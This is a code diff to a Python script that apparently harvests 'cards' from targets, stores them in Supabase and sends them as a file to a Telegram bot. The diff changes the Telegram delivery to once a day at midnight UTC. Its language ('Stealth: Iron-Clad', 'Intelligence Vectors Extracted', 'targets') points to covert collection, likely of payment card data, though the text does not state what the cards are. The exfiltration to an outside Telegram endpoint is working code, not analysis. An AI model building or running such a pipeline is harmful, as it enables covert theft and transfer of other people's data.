@@ -68,7 +68,7 @@ async def sync_to_targets(cards):
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(tmp_path, 'rb') as f:
             files = {'document': ('scythe_vectors.txt', f)}
-            caption = f"🎯 MISSION SUCCESS: {len(cards)} Intelligence Vectors Extracted.\n[Cycle: 12H | Stealth: Iron-Clad]"
+            caption = f"🎯 DAILY REPORT: {len(cards)} Intelligence Vectors Extracted.\n[Period: 24H | Stealth: Iron-Clad]"
             data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
             requests.post(url, data=data, files=files)
         os.unlink(tmp_path)
@@ -172,16 +172,32 @@ async def cloud_mission():
         print(f"  > Mission Synchronized. Transitioning targets in {int(wait)}s...")
         await asyncio.sleep(wait)
 
-    # FINAL DELIVERY: Every 12H mission sends the consolidated file
+    # FINAL DELIVERY: Send to Bot once per day at midnight (00:00 UTC)
+    current_hour = datetime.utcnow().hour
     staged = state.get_staged_cards()
+    
+    # Always save to Supabase (every 3 hours)
     if staged:
+        supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+        for card in staged:
+            try:
+                supabase.table("cards").upsert({"card_data": card}).execute()
+            except: pass
+        print(f"Saved {len(staged)} cards to Supabase.")
+    
+    # Send to Telegram Bot only once per day at midnight (00:00 UTC)
+    if staged and current_hour == 0:
+        print(f"🎯 Daily Report Time! Sending {len(staged)} cards to Telegram Bot...")
         await sync_to_targets(staged)
         state.clear_staged_cards()
+        print("✅ Daily report sent successfully!")
         # Unlock the scraper in Supabase for the next mission
         try:
             create_client(SUPABASE_URL, SUPABASE_KEY).table("system_settings").upsert({"key": "scraper_locked", "value": "false"}).execute()
         except:
             print("Cleanup Warning: Mission completed but Supabase unlock pending due to connection glitch.")
+    elif staged:
+        print(f"📊 Cards staged: {len(staged)} (will be sent at midnight UTC)")
     else:
         print("Intelligence Grid Clean: No new vectors detected.")
 
